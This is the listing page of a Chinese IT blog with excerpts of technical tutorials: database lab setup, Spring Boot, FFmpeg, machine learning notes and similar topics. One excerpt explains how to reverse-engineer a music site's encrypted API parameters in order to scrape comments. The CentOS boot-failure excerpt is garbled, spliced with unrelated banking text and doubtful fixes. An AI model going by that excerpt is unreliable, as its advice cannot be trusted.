<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25178de1d665c2a9e357755801778f9f/" rel="bookmark">
			CMU15445（2023 Spring） lab - 环境配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 系列笔记前言参考链接环境配置 系列笔记 环境配置
Project 0. C++ Primer
Project 1. Buffer Pool
Project 2. B+Tree
前言 早就想做15445（fall 2020）的lab了，鸽到了现在，赶紧做一下，写一点自己做的时候遇到的坑什么的，记录一下。因为教授禁止上传自己的代码到public，所以本文基本不会出现作业代码内容，只是写一些做的时候遇到的事情和一些思路，做备忘用（写不写还另说呢）。
然后我其实是想做2020FALL的，后来在做P0的时候发现那个文件（src/include/primer/p0_starter.h）怎么找也找不到，一直耽误了好久，才发现github库更新成2023年的了。，。。。那就将就着做2023 Spring吧
参考链接 课程官网（2023，废）
课程官网
环境配置 先配置环境，官方建议的是使用Ubuntu(20+)、MacOS，不推荐使用WSL，不过我就要硬着头皮上（），以后出了问题再说吧。以下流程大体来自官方文档。
创建一个私有库
git clone --bare https://github.com/cmu-db/bustub.git bustub-public cd bustub-public git push git@github.com:JMC2002/CMU15445.git master # 记得换成你自己的！ 删除本地克隆，拉取自己的
cd .. rm -rf bustub-public git clone git@github.com:JMC2002/CMU15445.git # 记得换成你自己的！ 这一步其实是用来更新官方文件的，但是这都是三年前的lab了，其实不太会有更新，还是做上吧。
git remote add public https://github.com/cmu-db/bustub.git 检查一下是否添加成功
git remote -v 然后是build
安装包
sudo build_support/packages.sh 注意，这里不出意外的话会有点问题，会报错找不到clang-14包，我们这样做：
wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add - sudo vi /etc/apt/sources.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25178de1d665c2a9e357755801778f9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcfcdbfea2cac7748351902061da3344/" rel="bookmark">
			CMU15445（2023 Spring） - Project 0. C&#43;&#43; Primer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 系列笔记作业链接TASK 1GetPutRemove Task 2 系列笔记 环境配置
Project 0. C++ Primer
Project 1. Buffer Pool
Project 2. B+Tree
作业链接 作业链接（2020，废）
作业链接
p0就是一个C++水平测试，很简单 2023的明显难不少。
TASK 1 先简单说一下看到这个数据结构时自己想到的一些问题与自己的思考：
为啥Put的实现这么奇葩，要求返回一颗新树，不会很耗资源吗？
显而易见Put是比较耗资源的，但是没有想象中的那么耗资源，因为Trie其实不负责具体资源的分配的，Trie代表的仅仅是一些索引而已，里面只存了一堆指针。为啥Get的实现要求先dynamic_cast到const TrieNodeWithValue&lt;T&gt;*，不嫌麻烦吗？*
这其实是为了实现异类集合，想想就知道了。 Get Get实现没啥难度，直接扫一遍key指针跟着跑就行，唯一一个小坑点是root_是个shared_ptr，不能直接做cast到裸指针，需要通过.get获取裸指针然后再做cast。
Put Put实现开始就有点麻烦了，这个题目的主要问题是想要修改一棵树，根据题目要求，这个Put是要返回一颗新Trie的，拿官方例子中的添加[“ad”, 2]为例，如果我们自顶向下构造new trie，首先建立new root，然后我们在new root里添加一个[‘a’, Node2]，然后在Node2里添加一个[‘d’, 2]，这一步就卡住了——我们在root里存的node2的指针是指const的，加不了！
想清楚这一点就很好解决了，我们就自底向上构建树，先从头到尾扫一遍key，公共结点一路clone下来，非公共结点新建资源，存到栈里，然后使用最后的那个结点的child与函数参数value构造一个TrieNodeWithValue，再反向遍历key并依次弹出stack，利用map::operator[]建立一颗树即可。
Remove Remove也就差不多的操作，首先扫一遍key，如果发现key不在Trie里或者key对应的结点压根没value，直接返回root无事发生，否则的话就入栈，然后用最后遍历到的那个结点的children去构造一个TrieNode并修改栈顶，然后依此出栈并erase掉children为empty的结点。
Task 2 没啥好说的，照着伪代码写就行，只要Task1没问题，Task2就不会有太大问题，记得写Put的时候别忘了move传value就行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ee4935e491710cc4b7cc4ab261127bd/" rel="bookmark">
			鸿蒙应用开发指南：从零开始构建一款智能音乐播放器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 随着鸿蒙操作系统的发布，开发者们迫不及待地想要探索鸿蒙应用的开发。本篇博客将以构建一款智能音乐播放器为例，带你一步步了解鸿蒙应用开发的技术要点和实践。我们将使用HarmonyOS的开发环境和MarkDown进行排版，方便你快速上手。
准备工作 在开始之前，确保你已经完成以下准备工作：
安装HarmonyOS的开发环境，包括鸿蒙IDE和相关工具。了解鸿蒙应用开发的基本概念和技术栈。确保你有一台鸿蒙设备或者模拟器用于测试。 步骤一：创建项目 首先，我们需要创建一个新的鸿蒙应用项目。打开鸿蒙IDE，点击“新建项目”按钮，填写项目名称和路径，并选择应用类型为“鸿蒙应用”。
步骤二：设计应用界面 一个好看且易用的应用界面对用户体验至关重要。我们将使用鸿蒙的UI组件库来设计我们的音乐播放器界面。
首先，我们需要创建一个主界面，包含音乐列表和控制按钮。使用MarkDown排版，可以方便地展示界面设计的代码和效果。
&lt;DirectionalLayout ohos:id="main_layout" ohos:height="match_parent" ohos:width="match_parent" ohos:orientation="vertical"&gt; &lt;Text ohos:id="title_text" ohos:text="My Music Player" ohos:height="wrap_content" ohos:width="match_parent" ohos:margin_top="16vp" ohos:text_alignment="center" ohos:text_size="32fp" /&gt; &lt;ListContainer ohos:id="music_list" ohos:height="0vp" ohos:width="match_parent" ohos:layout_weight="1"&gt; &lt;!-- 音乐列表项 --&gt; &lt;/ListContainer&gt; &lt;DirectionalLayout ohos:height="wrap_content" ohos:width="match_parent" ohos:padding="16vp" ohos:orientation="horizontal" ohos:alignment="center"&gt; &lt;Button ohos:id="play_button" ohos:height="wrap_content" ohos:width="match_content" ohos:text="Play" /&gt; &lt;Button ohos:id="pause_button" ohos:height="wrap_content" ohos:width="match_content" ohos:text="Pause" /&gt; &lt;Button ohos:id="stop_button" ohos:height="wrap_content" ohos:width="match_content" ohos:text="Stop" /&gt; &lt;/DirectionalLayout&gt; &lt;/DirectionalLayout&gt; 步骤三：添加音乐播放功能 现在我们开始实现音乐播放功能。首先，我们需要加载音乐文件，并将其显示在音乐列表中。
// 加载音乐文件 List&lt;String&gt; musicFiles = loadMusicFiles(); ListContainer musicList = findComponentById(ResourceTable.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ee4935e491710cc4b7cc4ab261127bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/516c862e50ff484a51c964236e1c1d6f/" rel="bookmark">
			训练强化学习的经验回放策略：experience replay
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		经验回放：Experience Replay（训练DQN的一种策略）
优点：可以重复利用离线经验数据；连续的经验具有相关性，经验回放可以在离线经验BUFFER随机抽样，减少相关性；
超参数：Replay Buffer的长度；
∙ Find w by minimizing L ( w ) = 1 T ∑ t = 1 T δ t 2 2 . ∙ Stochastic gradient descent (SGD): ∙ Randomly sample a transition, ( s i , a i , r i , s i + 1 ) , from the buffer ∙ Compute TD error, δ i . ∙ Stochastic gradient: g i = ∂ δ i 2 / 2 ∂ w = δ i ⋅ ∂ Q ( s i , a i ; w ) ∂ w ∙ SGD: w ← w − α ⋅ g i .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/516c862e50ff484a51c964236e1c1d6f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78b7c2fc9d49979650556bf5f195d6b4/" rel="bookmark">
			【爬虫逆向案例】某易云音乐（评论）js逆向—— params、encSecKey解密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		声明：本文只作学习研究，禁止用于非法用途，否则后果自负，如有侵权，请告知删除，谢谢！
【爬虫逆向案例】某易云音乐（评论）js逆向—— params、encSecKey解密 1、前言2、行动3、源码4、号外 1、前言 今天逆向的这个网站 某易云音乐 歌曲的评论列表
而要拿到评论列表爬虫发送的表单需要两个参数 params 和 encSecKey。这两个玩意是加密的，所以重点就是怎么搞定这两个参数。
2、行动 话不多说，直接分析。
首先我们进入到网易云，随便进入某一首歌详情页。通过抓包分析，很轻松的找到了每一首音乐的评论的位置，现在只需要访问 https://music.163.com/weapi/comment/resource/comments/get?csrf_token= 就可以了。
可以看到这是一个post请求，而且携带的这两个参数这么大一坨，不用多想，绝对是个加密参数。但是大家不要慌，让我们全局搜索一下（跟栈也可以，但我觉得这里直接搜索要快一点），仔细分析一波。
通过搜索任意一个参数可以快速找到加密的位置，可以看到
接下来就是打断点分析。
首先可以确定的是 params= bVe7X.encText,
encSecKey=bVe7X.encSecKey
而 bVe7X 又等于 window.asrsea 这个函数，观察可知这个函数是需要四个参数的，
在控制台中打印一下四个参数，分别是：
经过多次测试，发现后面三个参数是不变的（如下图），而第一个参数也只有 rid、threadId、cursor 会变，rid 和 threadId 还是一样的，而且是 R_SO_4_ 加上歌曲的 id，cursor 是毫秒的时间戳，那这就简单了。
好了，四个参数已经搞定，接下来就是关键了，进入 window.asrsea 函数
可以看到，d 就是 window.asrsea 这个函数。要传入的四个参数我们已经知道了。
不管那么多，直接复制到 js 文件里看看结果。
为了避免与后面其他的参数起冲突，这里我就改了下名字，然后运行。
意料之中，报错了。
说简单也简单，报错了之后，接下来就是缺什么补什么，这里就大家去 js 页面找自己慢慢去补了哈。
另外，当补到b函数的时候，会说 CryptoJS is not defined，仔细一看原来 b 函数里面有个 AES 加密，能调库就调库，这里就npm install crypto-js，然后导入就可以了
后面的就没有什么大问题了。补完函数后（大概有34个函数左右，400行左右的 js 代码），我们也是顺利的拿到了想要的东西。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78b7c2fc9d49979650556bf5f195d6b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e7dc464945e2ba5f8eec237fa10596f/" rel="bookmark">
			Centos开机无法正常启动?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Centos7开机无法正常启动?2、centos7虚拟机进不去一直ok3、服务器centos7开机卡住 Centos开机无法正常启动? kernel panic 该主机硬件不兼容该系统 请更换其他版本系统尝试安装 。CentOS是免费的、开源的、可以重新分发的开源操作系统，CentOS（Community Enterprise Operating System，中文意思是社区企业操作系统）是Linux发行版之一。
centos7虚拟机进不去一直ok的解决方法如下。以管理员身份运行cmd控制台程序。在cmd窗口中输入netshwinsockreset命令，作用是重置winsock网络规范。重启系统，再打开centos7虚拟机就可以正常启动系统了。
是系统故障。系统故障。bios没有设置好。主板或者是你内存的问题。
centos7虚拟机进不去一直ok 1、您centos7安装后无法启动的意思是linux虚拟机开机停留在ok界面是什么原因吧centos7安装后无法启动，原因如下centos7安装后无法启动：系统文件损坏：如果系统文件损坏或丢失centos7安装后无法启动，会导致系统无法正常启动。此时需要使用LiveCD等工具进行修复。
2、这是由于虚拟机的系统服务没有启动，所导致的虚拟机内部错误。解决方法如下。同时按下键盘上的win+r键，输入“services.msc”，然后按下回车，打开服务窗口。在服务窗口中，找到“VMware Authorization Service”一项。
3、for maintenance (or type Control-D to continue)：”现象：无法通过ssh访问 原因：设置里删了，但/etc/fstab里面的配置没删，导致出错。解决：修改/etc/fstab配置文件，将不存在的硬盘注释或删除即可。
4、制定专属信贷产品“双创贷”，并在湖北率先落地；对接工信部为“专精特新”小微企业提供特色金融服务，在长三角区域创新推出“交银科创”系列金融中药产品。
5、安装了图形界面的话，输入命令init5或是按键盘的Ctrl+Alt+F7都可以从文本界面切换到图形界面。
服务器centos7开机卡住 kernel panic 该主机硬件不兼容该系统 请更换其他版本系统尝试安装 。CentOS是免费的、开源的、可以重新分发的开源操作系统，CentOS（Community Enterprise Operating System，中文意思是社区企业操作系统）是Linux发行版之一。
将附件脚本解压上传到虚拟机后，脚本默认名字为centos1_systemd.sh，进入所在目录，执行如下操作：1）chmod a+x fix_systemd；2）./fix_systemd ；该操作立即生效，不需要另外重启。
首先使用U盘系统，进入系统文件，找到服务器的硬盘。其次新建一个文件夹new，将文件挂载到new上mount/dev/mapper/centos-rootnew，进入new。
关于centos7安装后无法启动和centos 安装完成后无法启动的介绍到此就结束了，不知道你从中找到你需要的信息了吗 ？如果你还想了解更多这方面的信息，记得收藏关注本站。
分类：centos 标签： centos7安装后无法启动 本文网址为：Centos7开机无法正常启动?
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/834a766ae16949835ce04967fe85b839/" rel="bookmark">
			CentOS7安装Maven详细教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		😊 @ 作者： Eric
💖 @ 主页： https://blog.csdn.net/weixin_47316183?type=blog
🎉 @ 主题：CentOS7安装Maven详细教程
⏱️ @ 创作时间： 2023年08月06日
第一步：上传或下载安装包（我这里放到 /usr/local 目录下）
maven-Linux版链接：https://pan.baidu.com/s/1CRlIx-S3qGXhj2GV9OUJvQ?pwd=Eric 提取码：Eric
2、第二步：解压安装包
tar -zvxf apache-maven-3.6.2-bin.tar.gz 3、第三步：建立软连接
ln -s /usr/local/apache-maven-3.6.2/ /usr/local/maven 4、 第四步：修改环境变量
vi /etc/profile 添加以下内容最 尾部
export MAVEN_HOME=/usr/local/maven export PATH=$PATH:$MAVEN_HOME/bin :wq 保存并退出
5、第五步：通过命令source /etc/profile让profile文件立即生效
source /etc/profile 最后测试是否安装成功
mvn -v 安装完成后如果要使用的话记得配置下阿里云依赖，不然下载会很慢
配置阿里云依赖：IDEA配置Maven项目 （超详细）
总结 怎么样，是不是特别的方便和简单~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57ee33d451fc55c01f65a65d40114bc6/" rel="bookmark">
			SpringBoot整合knife4j（快速入门超详细版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		😊 @ 作者： Eric
💖 @ 主页： https://blog.csdn.net/weixin_47316183?type=blog
🎉 @ 主题：SpringBoot整合knife4j（快速入门超详细版）
⏱️ @ 创作时间： 2023年08月01日
文章目录 1、什么是Knife4j2、SpringBoor整合Knife4j2.1、Knife4j配置2.2、使用Knife4j2.3、效果 总结 1、什么是Knife4j 在日常开发中，写接口文档是我们必不可少的，而Knife4j就是一个接口文档工具，可以看作是Swagger的升级版，但是界面比Swagger更好看，功能更丰富
早期，swagger-boostrap-ui是1.x版本，如今swagger-bootsrap-ui到2.x，同时也更改名字Knife4j，适用于单体和微服务项目。
Knife4j官方网站：https://doc.xiaominfo.com/
2、SpringBoor整合Knife4j 2.1、Knife4j配置 1、创建一个SpringBoot项目
2、引入Knife4j相关依赖（这里顺带引入了Lombok依赖）
&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.8&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; 3、创建Knife4J配置类
package com.eric.springbootknife4j.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.builders.ParameterBuilder; import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.schema.ModelRef; import springfox.documentation.service.ApiInfo; import springfox.documentation.service.Contact; import springfox.documentation.service.Parameter; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc; import java.util.ArrayList; import java.util.List; /** * Swagger2配置信息 * 这里分了两组显示 * 第一组是api，当作用户端接口 * 第二组是admin，当作后台管理接口 * 也可以根据实际情况来减少或者增加组 * * @author Eric * @date 2023-07-30 22:17 */ @Configuration @EnableSwagger2WebMvc public class Swagger2Config { private ApiInfo adminApiInfo() { return new ApiInfoBuilder() .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57ee33d451fc55c01f65a65d40114bc6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0730e7651127c7e271157e23aa745482/" rel="bookmark">
			SpringBoot实现文件记录日志，日志文件自动归档和压缩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		😊 @ 作者： Eric
💖 @ 主页： https://blog.csdn.net/weixin_47316183?type=blog
🎉 @ 主题：SpringBoot实现文件记录日志，日志文件自动归档和压缩
⏱️ @ 创作时间： 2023年08月06日
文章目录 1、什么是Logback2、SpringBoot实现文件记录日志，日志文件自动归档和压缩2.1、配置2.2、日志记录到文件中2.3、日志文件自动归档和压缩 总结 1、什么是Logback Logback是一个Java日志框架，它是log4j的后继者，被广泛用于应用程序中记录日志。
Logger（日志记录器）：
Logger 是 Logback 中最重要的组件之一。它负责收集应用程序中的日志信息，并将其传递给适当的 Appender 进行处理。Logger 使用不同的日志级别来决定日志信息的输出方式。常见的日志级别有 DEBUG、INFO、WARN、ERROR 和 TRACE。
Appender（日志输出目的地）：Appender 决定日志信息的输出目的地。Logback 提供了不同类型的 Appender，比如 ConsoleAppender、FileAppender 和 SocketAppender 等。每个 Appender 可以配置不同的 Layout，用于定义日志信息的格式。 Logback 的日志输出原理可以简单分为以下步骤：
应用程序代码中使用 Logger 记录日志。Logger 根据日志级别决定是否将日志信息传递给 Appender。当 Logger需要输出日志时，它会将日志信息封装成一个 LogEvent 对象。LogEvent 对象传递给配置好的 Appender。Appender 将根据配置将日志信息输出到不同的目的地，比如控制台、文件、远程服务器等。在输出日志之前，Appender 还会使用配置好的 Layout 对日志信息进行格式化。最终，格式化后的日志信息被输出到指定的目的地，供开发者和系统管理员查看和分析。 2、SpringBoot实现文件记录日志，日志文件自动归档和压缩 2.1、配置 1、引入依赖
&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; 2、在 resource 目录下 创建文件 logback-spring.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0730e7651127c7e271157e23aa745482/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33b035bf490a803e185f8d431e6aba45/" rel="bookmark">
			FFmepg视频解码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 前言 上一篇文章&lt;FFmpeg下载安装及Windows开发环境设置&gt;介绍了FFmpeg的下载安装及环境配置，本文介绍最简单的FFmpeg视频解码示例。
2 视频解码过程 本文只讨论视频解码。
FFmpeg视频解码的过程比较简单，实际就4步：
打开媒体流获取编码格式；循环获取解码帧显示图像关闭流 实际上前两步即已实现视频解码。
2.1 打开媒体流获取编码格式 1 打开流文件
这个函数avformat_open_input打开一个媒体流并读取其头信息，对于实时流或者不包含头信息的视频流，此函数通过几帧数据分析以获取其信息
此函数支持的媒体流非常广泛，包括本地视频文件、RTSP、TCP码流、UDP码流等等都支持。
m_pFmtCtx = nullptr; ret = avformat_open_input(&amp;m_pFmtCtx, sVideoUrl.c_str(), nullptr, nullptr); 2 在媒体流中寻找视频流
一个媒体流中可能包含了视频、音频、字幕、文本等多个流，到底哪个是我们要的视频流，需要首先确定，这个实际有两种方法，方法1是遍历媒体中所有的流，检查流类型判断哪个是视频流，找到视频流后获取其解码器：
m_nIndexVideo = -1; AVCodec* pAVCodec; //method 1 for (i = 0; i &lt; m_pFmtCtx-&gt;nb_streams; i++) { if (m_pFmtCtx-&gt;streams[i]-&gt;codecpar-&gt;codec_type == AVMEDIA_TYPE_VIDEO) { m_nIndexVideo = i; break; } } if (m_nIndexVideo &lt; 0) return false; pAVCodec = (AVCodec*)avcodec_find_decoder(m_pFmtCtx-&gt;streams[m_nIndexVideo]-&gt;codecpar-&gt;codec_id); 方法2就更简单，直接av_find_best_stream按视频格式查找最符合的流，并直接返回视频流序号及相应的解码器：
m_nIndexVideo = av_find_best_stream(m_pFmtCtx, AVMEDIA_TYPE_VIDEO, -1, -1, (const AVCodec**)&amp;pAVCodec, 0); 此两种方法结果是同样的，选择其中一种方法使用即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33b035bf490a803e185f8d431e6aba45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28936f8f0de89de976e0baeed2d7b973/" rel="bookmark">
			mediasoup Lite ICE实现说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一. 前言
二. Lite ICE流程
三. STUN协议说明
STUN Header
STUN Body
四. mediasoup Lite ICE实现源码剖析
一. 前言 ICE 是一种交互式建立连接的流程协议。ICE 有两种模式（Full ICE 和 Lite ICE），Full ICE 要求建立连接的双方都要执行连通性检测，而 Lite ICE 则只要求响应 STUN binding request 信息即可，它不需要添加候选者并对候选者进行连通性检测。
媒体服务器一般都使用的是 Lite ICE 实现，因为媒体服务器通常部署在公网，它的网络没有限制，因此一般只需要客户端检测与媒体服务器提供的候选者地址是连通的即可。
二. Lite ICE流程 mediasoup 客户端要进行推流首先要创建通道，创建通道是通过 createWebRtcTransport 信令完成的，该信令返回的信息包含 {id, iceParameters, iceCandidates, dtlsParameters, sctpParameters}，如下是一个示例值，包含了 ICE 的用户名，密码，使用的是 Lite ICE，以及候选者地址，优先级，协议等。
示例：{ id: ‘c0fe3f31-a764-40ff-88ff-69c14b83afda’,
iceParameters: { iceLite: true, password: ‘0pcc8bpoj1ug2s30p6ldh4qlgan1n5wd’, usernameFragment: '6jeiq5rqh7ke06dqzgnvzmg3iwtjxbqr' },
iceCandidates: [{"foundation":"udpcandidate","ip":"10.211.55.5","port":44445,"priority":1076302079,"protocol":"udp","type":"host"}],
dtlsParameters: { fingerprints: [ {"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/28936f8f0de89de976e0baeed2d7b973/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/577f17a943e0b833e7bc8610dfa99d3a/" rel="bookmark">
			解决群晖Transmission外网无法访问问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 环境描述和问题现象问题分析具体方法 环境描述和 群晖内网ip为：192.168.1.6
域名为www.xxxx.xxx
公网ip为122.122.XX.XX
群晖中已配置ssl证书
transmission是社群套件安装的
问题现象 在家中使用192.168.1.6:9091可正常打开transmission的web页面
使用https://www.xxxx.xxx:9091无法打开页面，提示不安全
在电脑cmd测试telnet www.xxxx.xxx 9091是通的
使用http://www.xxxx.xxx:9091无法打开页面，提示不安全
使用公网ip地址http://122.122.XX.XX:9091可以打开transmission的web页面
问题分析 transmission web也需要设置ssl，需要设置反向代理
具体方法 在控制面板-登录门户-高级中，添加一条反向代理。来源端口填写20001，目的地填写9091端口，群晖防火墙中新建一条允许规则，开放20001端口，最后在路由器中添加一条20001的映射，把如下图所示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09223b9557e443652c675b8cdf638df4/" rel="bookmark">
			【机器学习】西瓜书学习心得及课后习题参考答案—第6章支持向量机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔记心得 6.1 间隔与支持向量—— w w w是法向量，垂直与超平面 w T x + b = 0 w^Tx+b=0 wTx+b=0。这一节了解了支持向量机的基本型。
min ⁡ w , b 1 2 ∣ ∣ w ∣ ∣ 2 s . t . y i ( w T x i + b ) ≥ 1 , i = 1 , 2 , . . . , m . \min_{w,b} \frac{1}{2}||w||^2 \\ s.t. \ \ y_i(w^Tx_i+b) \ge 1, \qquad i=1,2,...,m. w,bmin​21​∣∣w∣∣2s.t. yi​(wTxi​+b)≥1,i=1,2,.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09223b9557e443652c675b8cdf638df4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64c28afab734cb3e58c001d91273abe5/" rel="bookmark">
			样题 GESP等级认证C&#43;&#43;编程（一级）试题解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【单选题】（每题2分）
1、人们在使用计算机时所提到的 Windows 通常指的是（ ）。
A、操作系统
B、多人游戏
C、上市公司
D、家居用具
正确答案：A
试题解析：计算机的Windows指的微软公司开发的视窗操作系统。
2、计算机领域的图灵奖为了纪念（ ）科学家图灵。
A、英国
B、德国
C、瑞典
D、法国
正确答案：A
试题解析：图灵奖，是计算机协会于1966年设立的奖项，专门奖励对计算机事业作出重要贡献的个人。其名称取自世界计算机科学的先驱、英国科学家、曼彻斯特大学教授艾伦·图灵（A.M. Turing）。
3、下列关于 C++语言的叙述，不正确的是（）。
A、变量使用前必须先定义
B、if 语句中的判断条件必须写在 ()中
C、for 语句的循环体必须写在{}中
D、程序必须先编译才能运行
正确答案：C
试题解析：for语句的循环体和if语句的代码，如果只有一句程序，可以不使用{}；
4、不可以作为 C++标识符的是（ ）。
A、a_plus_b
B、a_b
C、a+b
D、ab
正确答案：C
试题解析：C++标识符只能由字母、数字和下划线组成，选项C中有+号字符。
5、常量'3'的数据类型是（ ）。
A、int
B、char
C、bool
D、double
正确答案：B
试题解析：C语言中，字符型数据使用单引号，字符串则是使用双引号。
6、按照 C++语言的语法，以下不是正确的变量定义语句是（ ）。
A、int a;
B、int a = 10;
C、int a(10);
D、a = 10;
正确答案：D
试题解析：C++中，定义变量必须指定数据类型。
C++因为引入了对象，所以有int a(10)这样的形式初始化。
7、下列符号不是 C++语言的运算符的是（ ）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64c28afab734cb3e58c001d91273abe5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3396fd9ff4d8cf8f091a873635ec7bb7/" rel="bookmark">
			Linux各目录详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux文件系统是一个树状结构，由多个目录（或文件夹）组成。以下是常见的Linux目录及其功能的详细解释：
/（根目录）：在Linux文件系统中，所有其他目录和文件都是从根目录派生的。所有的存储设备、分区都作为子目录挂载在根目录下。例如，/home是根目录下的一个子目录，用于存储用户的主目录。
/bin（二进制目录）：这个目录包含了一些基本的可执行命令和工具，用于系统启动和在单用户模式下执行。例如，ls、cd等命令就位于该目录。
/boot（引导目录）：该目录包含了用于系统引导的文件，如内核和引导加载程序（bootloader）相关的文件。
/dev（设备目录）：该目录包含了系统中的设备文件。在Linux中，所有的设备都被表示为文件，可以通过这些设备文件与硬件进行交互。
/etc（配置目录）：该目录包含了系统的配置文件。大部分的应用程序和服务的配置文件都存在于这个目录下。例如，/etc/hosts存储了主机名和IP地址之间的映射关系。
/home（主目录）：每个用户在系统中都有一个主目录，用于存储个人文件和文档。例如，/home/username是用户username的主目录。
/lib（库目录）：该目录包含了系统所需的共享库文件。这些库文件由应用程序调用，提供特定功能的支持。
/media（挂载目录）：该目录是一个用于挂载可移动媒体设备（如USB驱动器、光驱等）的挂载点。
/mnt（挂载目录）：该目录是一个用于临时挂载其他文件系统的挂载点。通常用于挂载其他磁盘分区或网络文件系统。
/opt（可选目录）：该目录是用于存放可选应用程序的安装目录。通常，第三方软件包会将其安装到这个目录中。
/proc（进程目录）：该目录是一个虚拟文件系统，用于存储系统和正在运行进程的相关信息。通过读取这些文件，可以获取有关系统和进程的各种详细信息。
/root（根用户目录）：这是root用户的主目录。root用户是Linux系统中具有最高权限的用户。
